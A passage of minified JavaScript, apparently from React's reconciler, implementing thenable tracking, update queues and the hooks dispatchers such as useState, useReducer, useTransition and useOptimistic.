            for (var Se = 0; Se < le.length; Se++)
                (0,
                le[Se])(J)
        }, function(Se) {
            for (me.status = "rejected",
            me.reason = Se,
            Se = 0; Se < le.length; Se++)
                (0,
                le[Se])(void 0)
        }),
        me
    }
    var Bc = te.S;
    te.S = function(z, J) {
        typeof J == "object" && J !== null && typeof J.then == "function" && Ih(z, J),
        Bc !== null && Bc(z, J)
    }
    ;
    var _a = ie(null);
    function ju() {
        var z = _a.current;
        return z !== null ? z : dn.pooledCache
    }
    function xs(z, J) {
        J === null ? ge(_a, _a.current) : ge(_a, J.pool)
    }
    function Ic() {
        var z = ju();
        return z === null ? null : {
            parent: Rn._currentValue,
            pool: z
        }
    }
    var Mo = Error(O(460))
      , $c = Error(O(474))
      , Ss = Error(O(542))
      , Uu = {
        then: function() {}
    };
    function Nc(z) {
        return z = z.status,
        z === "fulfilled" || z === "rejected"
    }
    function Es() {}
    function Dc(z, J, le) {
        switch (le = z[le],
        le === void 0 ? z.push(J) : le !== J && (J.then(Es, Es),
        J = le),
        J.status) {
        case "fulfilled":
            return J.value;
        case "rejected":
            throw z = J.reason,
            jc(z),
            z;
        default:
            if (typeof J.status == "string")
                J.then(Es, Es);
            else {
                if (z = dn,
                z !== null && 100 < z.shellSuspendCounter)
                    throw Error(O(482));
                z = J,
                z.status = "pending",
                z.then(function(me) {
                    if (J.status === "pending") {
                        var Se = J;
                        Se.status = "fulfilled",
                        Se.value = me
                    }
                }, function(me) {
                    if (J.status === "pending") {
                        var Se = J;
                        Se.status = "rejected",
                        Se.reason = me
                    }
                })
            }
            switch (J.status) {
            case "fulfilled":
                return J.value;
            case "rejected":
                throw z = J.reason,
                jc(z),
                z
            }
            throw qo = J,
            Mo
        }
    }
    var qo = null;
    function Lc() {
        if (qo === null)
            throw Error(O(459));
        var z = qo;
        return qo = null,
        z
    }
    function jc(z) {
        if (z === Mo || z === Ss)
            throw Error(O(483))
    }
    var Di = !1;
    function Fu(z) {
        z.updateQueue = {
            baseState: z.memoizedState,
            firstBaseUpdate: null,
            lastBaseUpdate: null,
            shared: {
                pending: null,
                lanes: 0,
                hiddenCallbacks: null
            },
            callbacks: null
        }
    }
    function zu(z, J) {
        z = z.updateQueue,
        J.updateQueue === z && (J.updateQueue = {
            baseState: z.baseState,
            firstBaseUpdate: z.firstBaseUpdate,
            lastBaseUpdate: z.lastBaseUpdate,
            shared: z.shared,
            callbacks: null
        })
    }
    function Li(z) {
        return {
            lane: z,
            tag: 0,
            payload: null,
            callback: null,
            next: null
        }
    }
    function ji(z, J, le) {
        var me = z.updateQueue;
        if (me === null)
            return null;
        if (me = me.shared,
        (nn & 2) !== 0) {
            var Se = me.pending;
            return Se === null ? J.next = J : (J.next = Se.next,
            Se.next = J),
            me.pending = J,
            J = vs(z),
            Ac(z, null, le),
            J
        }
        return ps(z, me, J, le),
        vs(z)
    }
    function To(z, J, le) {
        if (J = J.updateQueue,
        J !== null && (J = J.shared,
        (le & 4194048) !== 0)) {
            var me = J.lanes;
            me &= z.pendingLanes,
            le |= me,
            J.lanes = le,
            Dt(z, le)
        }
    }
    function Hu(z, J) {
        var le = z.updateQueue
          , me = z.alternate;
        if (me !== null && (me = me.updateQueue,
        le === me)) {
            var Se = null
              , Oe = null;
            if (le = le.firstBaseUpdate,
            le !== null) {
                do {
                    var pt = {
                        lane: le.lane,
                        tag: le.tag,
                        payload: le.payload,
                        callback: null,
                        next: null
                    };
                    Oe === null ? Se = Oe = pt : Oe = Oe.next = pt,
                    le = le.next
                } while (le !== null);
                Oe === null ? Se = Oe = J : Oe = Oe.next = J
            } else
                Se = Oe = J;
            le = {
                baseState: me.baseState,
                firstBaseUpdate: Se,
                lastBaseUpdate: Oe,
                shared: me.shared,
                callbacks: me.callbacks
            },
            z.updateQueue = le;
            return
        }
        z = le.lastBaseUpdate,
        z === null ? le.firstBaseUpdate = J : z.next = J,
        le.lastBaseUpdate = J
    }
    var Vu = !1;
    function Co() {
        if (Vu) {
            var z = Ua;
            if (z !== null)
                throw z
        }
    }
    function ko(z, J, le, me) {
        Vu = !1;
        var Se = z.updateQueue;
        Di = !1;
        var Oe = Se.firstBaseUpdate
          , pt = Se.lastBaseUpdate
          , bt = Se.shared.pending;
        if (bt !== null) {
            Se.shared.pending = null;
            var Mt = bt
              , Ut = Mt.next;
            Mt.next = null,
            pt === null ? Oe = Ut : pt.next = Ut,
            pt = Mt;
            var Jt = z.alternate;
            Jt !== null && (Jt = Jt.updateQueue,
            bt = Jt.lastBaseUpdate,
            bt !== pt && (bt === null ? Jt.firstBaseUpdate = Ut : bt.next = Ut,
            Jt.lastBaseUpdate = Mt))
        }
        if (Oe !== null) {
            var rr = Se.baseState;
            pt = 0,
            Jt = Ut = Mt = null,
            bt = Oe;
            do {
                var zt = bt.lane & -536870913
                  , Ht = zt !== bt.lane;
                if (Ht ? (Wr & zt) === zt : (me & zt) === zt) {
                    zt !== 0 && zt === ja && (Vu = !0),
                    Jt !== null && (Jt = Jt.next = {
                        lane: 0,
                        tag: bt.tag,
                        payload: bt.payload,
                        callback: null,
                        next: null
                    });
                    e: {
                        var $r = z
                          , kr = bt;
                        zt = J;
                        var un = le;
                        switch (kr.tag) {
                        case 1:
                            if ($r = kr.payload,
                            typeof $r == "function") {
                                rr = $r.call(un, rr, zt);
                                break e
                            }
                            rr = $r;
                            break e;
                        case 3:
                            $r.flags = $r.flags & -65537 | 128;
                        case 0:
                            if ($r = kr.payload,
                            zt = typeof $r == "function" ? $r.call(un, rr, zt) : $r,
                            zt == null)
                                break e;
                            rr = V({}, rr, zt);
                            break e;
                        case 2:
                            Di = !0
                        }
                    }
                    zt = bt.callback,
                    zt !== null && (z.flags |= 64,
                    Ht && (z.flags |= 8192),
                    Ht = Se.callbacks,
                    Ht === null ? Se.callbacks = [zt] : Ht.push(zt))
                } else
                    Ht = {
                        lane: zt,
                        tag: bt.tag,
                        payload: bt.payload,
                        callback: bt.callback,
                        next: null
                    },
                    Jt === null ? (Ut = Jt = Ht,
                    Mt = rr) : Jt = Jt.next = Ht,
                    pt |= zt;
                if (bt = bt.next,
                bt === null) {
                    if (bt = Se.shared.pending,
                    bt === null)
                        break;
                    Ht = bt,
                    bt = Ht.next,
                    Ht.next = null,
                    Se.lastBaseUpdate = Ht,
                    Se.shared.pending = null
                }
            } while (!0);
            Jt === null && (Mt = rr),
            Se.baseState = Mt,
            Se.firstBaseUpdate = Ut,
            Se.lastBaseUpdate = Jt,
            Oe === null && (Se.shared.lanes = 0),
            Gi |= pt,
            z.lanes = pt,
            z.memoizedState = rr
        }
    }
    function Uc(z, J) {
        if (typeof z != "function")
            throw Error(O(191, z));
        z.call(J)
    }
    function Fc(z, J) {
        var le = z.callbacks;
        if (le !== null)
            for (z.callbacks = null,
            z = 0; z < le.length; z++)
                Uc(le[z], J)
    }
    var Fa = ie(null)
      , Rs = ie(0);
    function zc(z, J) {
        z = Ci,
        ge(Rs, z),
        ge(Fa, J),
        Ci = z | J.baseLanes
    }
    function Ku() {
        ge(Rs, Ci),
        ge(Fa, Fa.current)
    }
    function Xu() {
        Ci = Rs.current,
        ve(Fa),
        ve(Rs)
    }
    var Ui = 0
      , zr = null
      , on = null
      , wn = null
      , As = !1
      , za = !1
      , wa = !1
      , Ms = 0
      , Oo = 0
      , Ha = null
      , Nh = 0;
    function gn() {
        throw Error(O(321))
    }
    function Gu(z, J) {
        if (J === null)
            return !1;
        for (var le = 0; le < J.length && le < z.length; le++)
            if (!Hn(z[le], J[le]))
                return !1;
        return !0
    }
    function Wu(z, J, le, me, Se, Oe) {
        return Ui = Oe,
        zr = J,
        J.memoizedState = null,
        J.updateQueue = null,
        J.lanes = 0,
        te.H = z === null || z.memoizedState === null ? Mf : qf,
        wa = !1,
        Oe = le(me, Se),
        wa = !1,
        za && (Oe = Vc(J, le, me, Se)),
        Hc(z),
        Oe
    }
    function Hc(z) {
        te.H = Ps;
        var J = on !== null && on.next !== null;
        if (Ui = 0,
        wn = on = zr = null,
        As = !1,
        Oo = 0,
        Ha = null,
        J)
            throw Error(O(300));
        z === null || Mn || (z = z.dependencies,
        z !== null && _s(z) && (Mn = !0))
    }
    function Vc(z, J, le, me) {
        zr = z;
        var Se = 0;
        do {
            if (za && (Ha = null),
            Oo = 0,
            za = !1,
            25 <= Se)
                throw Error(O(301));
            if (Se += 1,
            wn = on = null,
            z.updateQueue != null) {
                var Oe = z.updateQueue;
                Oe.lastEffect = null,
                Oe.events = null,
                Oe.stores = null,
                Oe.memoCache != null && (Oe.memoCache.index = 0)
            }
            te.H = Hh,
            Oe = J(le, me)
        } while (za);
        return Oe
    }
    function Dh() {
        var z = te.H
          , J = z.useState()[0];
        return J = typeof J.then == "function" ? Po(J) : J,
        z = z.useState()[0],
        (on !== null ? on.memoizedState : null) !== z && (zr.flags |= 1024),
        J
    }
    function Yu() {
        var z = Ms !== 0;
        return Ms = 0,
        z
    }
    function Zu(z, J, le) {
        J.updateQueue = z.updateQueue,
        J.flags &= -2053,
        z.lanes &= ~le
    }
    function Qu(z) {
        if (As) {
            for (z = z.memoizedState; z !== null; ) {
                var J = z.queue;
                J !== null && (J.pending = null),
                z = z.next
            }
            As = !1
        }
        Ui = 0,
        wn = on = zr = null,
        za = !1,
        Oo = Ms = 0,
        Ha = null
    }
    function jn() {
        var z = {
            memoizedState: null,
            baseState: null,
            baseQueue: null,
            queue: null,
            next: null
        };
        return wn === null ? zr.memoizedState = wn = z : wn = wn.next = z,
        wn
    }
    function xn() {
        if (on === null) {
            var z = zr.alternate;
            z = z !== null ? z.memoizedState : null
        } else
            z = on.next;
        var J = wn === null ? zr.memoizedState : wn.next;
        if (J !== null)
            wn = J,
            on = z;
        else {
            if (z === null)
                throw zr.alternate === null ? Error(O(467)) : Error(O(310));
            on = z,
            z = {
                memoizedState: on.memoizedState,
                baseState: on.baseState,
                baseQueue: on.baseQueue,
                queue: on.queue,
                next: null
            },
            wn === null ? zr.memoizedState = wn = z : wn = wn.next = z
        }
        return wn
    }
    function Ju() {
        return {
            lastEffect: null,
            events: null,
            stores: null,
            memoCache: null
        }
    }
    function Po(z) {
        var J = Oo;
        return Oo += 1,
        Ha === null && (Ha = []),
        z = Dc(Ha, z, J),
        J = zr,
        (wn === null ? J.memoizedState : wn.next) === null && (J = J.alternate,
        te.H = J === null || J.memoizedState === null ? Mf : qf),
        z
    }
    function qs(z) {
        if (z !== null && typeof z == "object") {
            if (typeof z.then == "function")
                return Po(z);
            if (z.$$typeof === he)
                return In(z)
        }
        throw Error(O(438, String(z)))
    }
    function el(z) {
        var J = null
          , le = zr.updateQueue;
        if (le !== null && (J = le.memoCache),
        J == null) {
            var me = zr.alternate;
            me !== null && (me = me.updateQueue,
            me !== null && (me = me.memoCache,
            me != null && (J = {
                data: me.data.map(function(Se) {
                    return Se.slice()
                }),
                index: 0
            })))
        }
        if (J == null && (J = {
            data: [],
            index: 0
        }),
        le === null && (le = Ju(),
        zr.updateQueue = le),
        le.memoCache = J,
        le = J.data[J.index],
        le === void 0)
            for (le = J.data[J.index] = Array(z),
            me = 0; me < z; me++)
                le[me] = Be;
        return J.index++,
        le
    }
    function Ei(z, J) {
        return typeof J == "function" ? J(z) : J
    }
    function Ts(z) {
        var J = xn();
        return tl(J, on, z)
    }
    function tl(z, J, le) {
        var me = z.queue;
        if (me === null)
            throw Error(O(311));
        me.lastRenderedReducer = le;
        var Se = z.baseQueue
          , Oe = me.pending;
        if (Oe !== null) {
            if (Se !== null) {
                var pt = Se.next;
                Se.next = Oe.next,
                Oe.next = pt
            }
            J.baseQueue = Se = Oe,
            me.pending = null
        }
        if (Oe = z.baseState,
        Se === null)
            z.memoizedState = Oe;
        else {
            J = Se.next;
            var bt = pt = null
              , Mt = null
              , Ut = J
              , Jt = !1;
            do {
                var rr = Ut.lane & -536870913;
                if (rr !== Ut.lane ? (Wr & rr) === rr : (Ui & rr) === rr) {
                    var zt = Ut.revertLane;
                    if (zt === 0)
                        Mt !== null && (Mt = Mt.next = {
                            lane: 0,
                            revertLane: 0,
                            action: Ut.action,
                            hasEagerState: Ut.hasEagerState,
                            eagerState: Ut.eagerState,
                            next: null
                        }),
                        rr === ja && (Jt = !0);
                    else if ((Ui & zt) === zt) {
                        Ut = Ut.next,
                        zt === ja && (Jt = !0);
                        continue
                    } else
                        rr = {
                            lane: 0,
                            revertLane: Ut.revertLane,
                            action: Ut.action,
                            hasEagerState: Ut.hasEagerState,
                            eagerState: Ut.eagerState,
                            next: null
                        },
                        Mt === null ? (bt = Mt = rr,
                        pt = Oe) : Mt = Mt.next = rr,
                        zr.lanes |= zt,
                        Gi |= zt;
                    rr = Ut.action,
                    wa && le(Oe, rr),
                    Oe = Ut.hasEagerState ? Ut.eagerState : le(Oe, rr)
                } else
                    zt = {
                        lane: rr,
                        revertLane: Ut.revertLane,
                        action: Ut.action,
                        hasEagerState: Ut.hasEagerState,
                        eagerState: Ut.eagerState,
                        next: null
                    },
                    Mt === null ? (bt = Mt = zt,
                    pt = Oe) : Mt = Mt.next = zt,
                    zr.lanes |= rr,
                    Gi |= rr;
                Ut = Ut.next
            } while (Ut !== null && Ut !== J);
            if (Mt === null ? pt = Oe : Mt.next = bt,
            !Hn(Oe, z.memoizedState) && (Mn = !0,
            Jt && (le = Ua,
            le !== null)))
                throw le;
            z.memoizedState = Oe,
            z.baseState = pt,
            z.baseQueue = Mt,
            me.lastRenderedState = Oe
        }
        return Se === null && (me.lanes = 0),
        [z.memoizedState, me.dispatch]
    }
    function rl(z) {
        var J = xn()
          , le = J.queue;
        if (le === null)
            throw Error(O(311));
        le.lastRenderedReducer = z;
        var me = le.dispatch
          , Se = le.pending
          , Oe = J.memoizedState;
        if (Se !== null) {
            le.pending = null;
            var pt = Se = Se.next;
            do
                Oe = z(Oe, pt.action),
                pt = pt.next;
            while (pt !== Se);
            Hn(Oe, J.memoizedState) || (Mn = !0),
            J.memoizedState = Oe,
            J.baseQueue === null && (J.baseState = Oe),
            le.lastRenderedState = Oe
        }
        return [Oe, me]
    }
    function Kc(z, J, le) {
        var me = zr
          , Se = xn()
          , Oe = Jr;
        if (Oe) {
            if (le === void 0)
                throw Error(O(407));
            le = le()
        } else
            le = J();
        var pt = !Hn((on || Se).memoizedState, le);
        pt && (Se.memoizedState = le,
        Mn = !0),
        Se = Se.queue;
        var bt = Wc.bind(null, me, Se, z);
        if (Bo(2048, 8, bt, [z]),
        Se.getSnapshot !== J || pt || wn !== null && wn.memoizedState.tag & 1) {
            if (me.flags |= 2048,
            Va(9, Cs(), Gc.bind(null, me, Se, le, J), null),
            dn === null)
                throw Error(O(349));
            Oe || (Ui & 124) !== 0 || Xc(me, J, le)
        }
        return le
    }
    function Xc(z, J, le) {
        z.flags |= 16384,
        z = {
            getSnapshot: J,
            value: le
        },
        J = zr.updateQueue,
        J === null ? (J = Ju(),
        zr.updateQueue = J,
        J.stores = [z]) : (le = J.stores,
        le === null ? J.stores = [z] : le.push(z))
    }
    function Gc(z, J, le, me) {
        J.value = le,
        J.getSnapshot = me,
        Yc(J) && Zc(z)
    }
    function Wc(z, J, le) {
        return le(function() {
            Yc(J) && Zc(z)
        })
    }
    function Yc(z) {
        var J = z.getSnapshot;
        z = z.value;
        try {
            var le = J();
            return !Hn(z, le)
        } catch {
            return !0
        }
    }
    function Zc(z) {
        var J = $a(z, 2);
        J !== null && Yn(J, z, 2)
    }
    function nl(z) {
        var J = jn();
        if (typeof z == "function") {
            var le = z;
            if (z = le(),
            wa) {
                tt(!0);
                try {
                    le()
                } finally {
                    tt(!1)
                }
            }
        }
        return J.memoizedState = J.baseState = z,
        J.queue = {
            pending: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: Ei,
            lastRenderedState: z
        },
        J
    }
    function Qc(z, J, le, me) {
        return z.baseState = le,
        tl(z, on, typeof me == "function" ? me : Ei)
    }
    function Lh(z, J, le, me, Se) {
        if (Os(z))
            throw Error(O(485));
        if (z = J.action,
        z !== null) {
            var Oe = {
                payload: Se,
                action: z,
                next: null,
                isTransition: !0,
                status: "pending",
                value: null,
                reason: null,
                listeners: [],
                then: function(pt) {
                    Oe.listeners.push(pt)
                }
            };
            te.T !== null ? le(!0) : Oe.isTransition = !1,
            me(Oe),
            le = J.pending,
            le === null ? (Oe.next = J.pending = Oe,
            Jc(J, Oe)) : (Oe.next = le.next,
            J.pending = le.next = Oe)
        }
    }
    function Jc(z, J) {
        var le = J.action
          , me = J.payload
          , Se = z.state;
        if (J.isTransition) {
            var Oe = te.T
              , pt = {};
            te.T = pt;
            try {
                var bt = le(Se, me)
                  , Mt = te.S;
                Mt !== null && Mt(pt, bt),
                ef(z, J, bt)
            } catch (Ut) {
                il(z, J, Ut)
            } finally {
                te.T = Oe
            }
        } else
            try {
                Oe = le(Se, me),
                ef(z, J, Oe)
            } catch (Ut) {
                il(z, J, Ut)
            }
    }
    function ef(z, J, le) {
        le !== null && typeof le == "object" && typeof le.then == "function" ? le.then(function(me) {
            tf(z, J, me)
        }, function(me) {
            return il(z, J, me)
        }) : tf(z, J, le)
    }
    function tf(z, J, le) {
        J.status = "fulfilled",
        J.value = le,
        rf(J),
        z.state = le,
        J = z.pending,
        J !== null && (le = J.next,
        le === J ? z.pending = null : (le = le.next,
        J.next = le,
        Jc(z, le)))
    }
    function il(z, J, le) {
        var me = z.pending;
        if (z.pending = null,
        me !== null) {
            me = me.next;
            do
                J.status = "rejected",
                J.reason = le,
                rf(J),
                J = J.next;
            while (J !== me)
        }
        z.action = null
    }
    function rf(z) {
        z = z.listeners;
        for (var J = 0; J < z.length; J++)
            (0,
            z[J])()
    }
    function nf(z, J) {
        return J
    }
    function af(z, J) {
        if (Jr) {
            var le = dn.formState;
            if (le !== null) {
                e: {
                    var me = zr;
                    if (Jr) {
                        if (vn) {
                            t: {
                                for (var Se = vn, Oe = fi; Se.nodeType !== 8; ) {
                                    if (!Oe) {
                                        Se = null;
                                        break t
                                    }
                                    if (Se = li(Se.nextSibling),
                                    Se === null) {
                                        Se = null;
                                        break t
                                    }
                                }
                                Oe = Se.data,
                                Se = Oe === "F!" || Oe === "F" ? Se : null
                            }
                            if (Se) {
                                vn = li(Se.nextSibling),
                                me = Se.data === "F!";
                                break e
                            }
                        }
                        ya(me)
                    }
                    me = !1
                }
                me && (J = le[0])
            }
        }
        return le = jn(),
        le.memoizedState = le.baseState = J,
        me = {
            pending: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: nf,
            lastRenderedState: J
        },
        le.queue = me,
        le = Ef.bind(null, zr, me),
        me.dispatch = le,
        me = nl(!1),
        Oe = ll.bind(null, zr, !1, me.queue),
        me = jn(),
        Se = {
            state: J,
            dispatch: null,
            action: z,
            pending: null
        },
        me.queue = Se,
        le = Lh.bind(null, zr, Se, Oe, le),
        Se.dispatch = le,
        me.memoizedState = z,
        [J, le, !1]
    }
    function of(z) {
        var J = xn();
        return sf(J, on, z)
    }
    function sf(z, J, le) {
        if (J = tl(z, J, nf)[0],
        z = Ts(Ei)[0],
        typeof J == "object" && J !== null && typeof J.then == "function")
            try {
                var me = Po(J)
            } catch (pt) {
                throw pt === Mo ? Ss : pt
            }
        else
            me = J;
        J = xn();
        var Se = J.queue
          , Oe = Se.dispatch;
        return le !== J.memoizedState && (zr.flags |= 2048,
        Va(9, Cs(), jh.bind(null, Se, le), null)),
        [me, Oe, z]
    }
    function jh(z, J) {
        z.action = J
    }
    function uf(z) {
        var J = xn()
          , le = on;
        if (le !== null)
            return sf(J, le, z);
        xn(),
        J = J.memoizedState,
        le = xn();
        var me = le.queue.dispatch;
        return le.memoizedState = z,
        [J, me, !1]
    }
    function Va(z, J, le, me) {
        return z = {
            tag: z,
            create: le,
            deps: me,
            inst: J,
            next: null
        },
        J = zr.updateQueue,
        J === null && (J = Ju(),
        zr.updateQueue = J),
        le = J.lastEffect,
        le === null ? J.lastEffect = z.next = z : (me = le.next,
        le.next = z,
        z.next = me,
        J.lastEffect = z),
        z
    }
    function Cs() {
        return {
            destroy: void 0,
            resource: void 0
        }
    }
    function lf() {
        return xn().memoizedState
    }
    function ks(z, J, le, me) {
        var Se = jn();
        me = me === void 0 ? null : me,
        zr.flags |= z,
        Se.memoizedState = Va(1 | J, Cs(), le, me)
    }
    function Bo(z, J, le, me) {
        var Se = xn();
        me = me === void 0 ? null : me;
        var Oe = Se.memoizedState.inst;
        on !== null && me !== null && Gu(me, on.memoizedState.deps) ? Se.memoizedState = Va(J, Oe, le, me) : (zr.flags |= z,
        Se.memoizedState = Va(1 | J, Oe, le, me))
    }
    function cf(z, J) {
        ks(8390656, 8, z, J)
    }
    function ff(z, J) {
        Bo(2048, 8, z, J)
    }
    function df(z, J) {
        return Bo(4, 2, z, J)
    }
    function hf(z, J) {
        return Bo(4, 4, z, J)
    }
    function pf(z, J) {
        if (typeof J == "function") {
            z = z();
            var le = J(z);
            return function() {
                typeof le == "function" ? le() : J(null)
            }
        }
        if (J != null)
            return z = z(),
            J.current = z,
            function() {
                J.current = null
            }
    }
    function mf(z, J, le) {
        le = le != null ? le.concat([z]) : null,
        Bo(4, 4, pf.bind(null, J, z), le)
    }
    function al() {}
    function vf(z, J) {
        var le = xn();
        J = J === void 0 ? null : J;
        var me = le.memoizedState;
        return J !== null && Gu(J, me[1]) ? me[0] : (le.memoizedState = [z, J],
        z)
    }
    function yf(z, J) {
        var le = xn();
        J = J === void 0 ? null : J;
        var me = le.memoizedState;
        if (J !== null && Gu(J, me[1]))
            return me[0];
        if (me = z(),
        wa) {
            tt(!0);
            try {
                z()
            } finally {
                tt(!1)
            }
        }
        return le.memoizedState = [me, J],
        me
    }
    function ol(z, J, le) {
        return le === void 0 || (Ui & 1073741824) !== 0 ? z.memoizedState = J : (z.memoizedState = le,
        z = _d(),
        zr.lanes |= z,
        Gi |= z,
        le)
    }
    function gf(z, J, le, me) {
        return Hn(le, J) ? le : Fa.current !== null ? (z = ol(z, le, me),
        Hn(z, J) || (Mn = !0),
        z) : (Ui & 42) === 0 ? (Mn = !0,
        z.memoizedState = le) : (z = _d(),
        zr.lanes |= z,
        Gi |= z,
        J)
    }
    function bf(z, J, le, me, Se) {
        var Oe = se.p;
        se.p = Oe !== 0 && 8 > Oe ? Oe : 8;
        var pt = te.T
          , bt = {};
        te.T = bt,
        ll(z, !1, J, le);
        try {
            var Mt = Se()
              , Ut = te.S;
            if (Ut !== null && Ut(bt, Mt),
            Mt !== null && typeof Mt == "object" && typeof Mt.then == "function") {
                var Jt = $h(Mt, me);
                Io(z, J, Jt, Wn(z))
            } else
                Io(z, J, me, Wn(z))
        } catch (rr) {
            Io(z, J, {
                then: function() {},
                status: "rejected",
                reason: rr
            }, Wn())
        } finally {
            se.p = Oe,
            te.T = pt
        }
    }
    function Uh() {}
    function sl(z, J, le, me) {
        if (z.tag !== 5)
            throw Error(O(476));
        var Se = _f(z).queue;
        bf(z, Se, J, de, le === null ? Uh : function() {
            return wf(z),
            le(me)
        }
        )
    }
    function _f(z) {
        var J = z.memoizedState;
        if (J !== null)
            return J;
        J = {
            memoizedState: de,
            baseState: de,
            baseQueue: null,
            queue: {
                pending: null,
                lanes: 0,
                dispatch: null,
                lastRenderedReducer: Ei,
                lastRenderedState: de
            },
            next: null
        };
        var le = {};
        return J.next = {
            memoizedState: le,
            baseState: le,
            baseQueue: null,
            queue: {
                pending: null,
                lanes: 0,
                dispatch: null,
                lastRenderedReducer: Ei,
                lastRenderedState: le
            },
            next: null
        },
        z.memoizedState = J,
        z = z.alternate,
        z !== null && (z.memoizedState = J),
        J
    }
    function wf(z) {
        var J = _f(z).next.queue;
        Io(z, J, {}, Wn())
    }
    function ul() {
        return In(Jo)
    }
    function xf() {
        return xn().memoizedState
    }
    function Sf() {
        return xn().memoizedState
    }
    function Fh(z) {
        for (var J = z.return; J !== null; ) {
            switch (J.tag) {
            case 24:
            case 3:
                var le = Wn();
                z = Li(le);
                var me = ji(J, z, le);
                me !== null && (Yn(me, J, le),
                To(me, J, le)),
                J = {
                    cache: Du()
                },
                z.payload = J;
                return
            }
            J = J.return
        }
    }
    function zh(z, J, le) {
        var me = Wn();
        le = {
            lane: me,
            revertLane: 0,
            action: le,
            hasEagerState: !1,
            eagerState: null,
            next: null
        },
        Os(z) ? Rf(J, le) : (le = qu(z, J, le, me),
        le !== null && (Yn(le, z, me),
        Af(le, J, me)))
    }
    function Ef(z, J, le) {
        var me = Wn();
        Io(z, J, le, me)
    }
    function Io(z, J, le, me) {
        var Se = {
            lane: me,
            revertLane: 0,
            action: le,
            hasEagerState: !1,
            eagerState: null,
            next: null
        };
        if (Os(z))
            Rf(J, Se);
        else {
            var Oe = z.alternate;
            if (z.lanes === 0 && (Oe === null || Oe.lanes === 0) && (Oe = J.lastRenderedReducer,
            Oe !== null))
                try {
                    var pt = J.lastRenderedState
                      , bt = Oe(pt, le);
                    if (Se.hasEagerState = !0,
                    Se.eagerState = bt,
                    Hn(bt, pt))
                        return ps(z, J, Se, 0),
                        dn === null && hs(),
                        !1
                } catch {} finally {}
            if (le = qu(z, J, Se, me),
            le !== null)
                return Yn(le, z, me),
                Af(le, J, me),
                !0
        }
        return !1
    }
    function ll(z, J, le, me) {
        if (me = {
            lane: 2,
            revertLane: Ul(),
            action: me,
            hasEagerState: !1,
            eagerState: null,
            next: null
        },
        Os(z)) {
            if (J)
                throw Error(O(479))
        } else
            J = qu(z, le, me, 2),
            J !== null && Yn(J, z, 2)
    }
    function Os(z) {
        var J = z.alternate;
        return z === zr || J !== null && J === zr
    }
    function Rf(z, J) {
        za = As = !0;
        var le = z.pending;
        le === null ? J.next = J : (J.next = le.next,
        le.next = J),
        z.pending = J
    }
    function Af(z, J, le) {
        if ((le & 4194048) !== 0) {
            var me = J.lanes;
            me &= z.pendingLanes,
            le |= me,
            J.lanes = le,
            Dt(z, le)
        }
    }
    var Ps = {
        readContext: In,
        use: qs,
        useCallback: gn,
        useContext: gn,
        useEffect: gn,
        useImperativeHandle: gn,
        useLayoutEffect: gn,
        useInsertionEffect: gn,
        useMemo: gn,
        useReducer: gn,
        useRef: gn,
        useState: gn,
        useDebugValue: gn,
        useDeferredValue: gn,
        useTransition: gn,
        useSyncExternalStore: gn,
        useId: gn,
        useHostTransitionStatus: gn,
        useFormState: gn,
        useActionState: gn,
        useOptimistic: gn,
        useMemoCache: gn,
        useCacheRefresh: gn
    }
      , Mf = {
        readContext: In,
        use: qs,
        useCallback: function(z, J) {
            return jn().memoizedState = [z, J === void 0 ? null : J],
            z
        },
        useContext: In,
        useEffect: cf,
        useImperativeHandle: function(z, J, le) {
            le = le != null ? le.concat([z]) : null,
            ks(4194308, 4, pf.bind(null, J, z), le)
        },
        useLayoutEffect: function(z, J) {
            return ks(4194308, 4, z, J)
        },
        useInsertionEffect: function(z, J) {
            ks(4, 2, z, J)
        },
        useMemo: function(z, J) {
            var le = jn();
            J = J === void 0 ? null : J;
            var me = z();
            if (wa) {
                tt(!0);
                try {
                    z()
                } finally {
                    tt(!1)
                }
            }
            return le.memoizedState = [me, J],
            me
        },
        useReducer: function(z, J, le) {
            var me = jn();
            if (le !== void 0) {
                var Se = le(J);
                if (wa) {
                    tt(!0);
                    try {
                        le(J)
                    } finally {
                        tt(!1)
                    }
                }
            } else
                Se = J;
            return me.memoizedState = me.baseState = Se,
            z = {
                pending: null,
                lanes: 0,
                dispatch: null,
                lastRenderedReducer: z,
                lastRenderedState: Se
            },
            me.queue = z,
            z = z.dispatch = zh.bind(null, zr, z),
            [me.memoizedState, z]
        },
        useRef: function(z) {
            var J = jn();
            return z = {
                current: z
            },
            J.memoizedState = z
        },
        useState: function(z) {
            z = nl(z);
            var J = z.queue
              , le = Ef.bind(null, zr, J);
            return J.dispatch = le,
            [z.memoizedState, le]
        },
        useDebugValue: al,
        useDeferredValue: function(z, J) {
            var le = jn();
            return ol(le, z, J)
        },
        useTransition: function() {
            var z = nl(!1);
            return z = bf.bind(null, zr, z.queue, !0, !1),
            jn().memoizedState = z,
            [!1, z]
        },
        useSyncExternalStore: function(z, J, le) {
            var me = zr
              , Se = jn();
            if (Jr) {
                if (le === void 0)
                    throw Error(O(407));
                le = le()
            } else {
                if (le = J(),
                dn === null)
                    throw Error(O(349));
                (Wr & 124) !== 0 || Xc(me, J, le)
            }
            Se.memoizedState = le;
            var Oe = {
                value: le,
                getSnapshot: J
            };
            return Se.queue = Oe,
            cf(Wc.bind(null, me, Oe, z), [z]),
            me.flags |= 2048,
            Va(9, Cs(), Gc.bind(null, me, Oe, le, J), null),
            le
        },
        useId: function() {
            var z = jn()
              , J = dn.identifierPrefix;
            if (Jr) {
                var le = wi
                  , me = _i;
                le = (me & ~(1 << 32 - He(me) - 1)).toString(32) + le,
                J = "" + J + "R" + le,
                le = Ms++,
                0 < le && (J += "H" + le.toString(32)),
                J += ""
            } else
                le = Nh++,
                J = "" + J + "r" + le.toString(32) + "";
            return z.memoizedState = J
        },
        useHostTransitionStatus: ul,
        useFormState: af,
        useActionState: af,
        useOptimistic: function(z) {
            var J = jn();
            J.memoizedState = J.baseState = z;
            var le = {
                pending: null,
                lanes: 0,
                dispatch: null,
                lastRenderedReducer: null,
                lastRenderedState: null
            };
            return J.queue = le,
            J = ll.bind(null, zr, !0, le),
            le.dispatch = J,
            [z, J]
        },
        useMemoCache: el,
        useCacheRefresh: function() {
            return jn().memoizedState = Fh.bind(null, zr)
        }
    }
      , qf = {
        readContext: In,
        use: qs,
        useCallback: vf,
        useContext: In,
        useEffect: ff,
        useImperativeHandle: mf,
        useInsertionEffect: df,
        useLayoutEffect: hf,
        useMemo: yf,
        useReducer: Ts,
        useRef: lf,
        useState: function() {
            return Ts(Ei)
        },
        useDebugValue: al,
        useDeferredValue: function(z, J) {
            var le = xn();
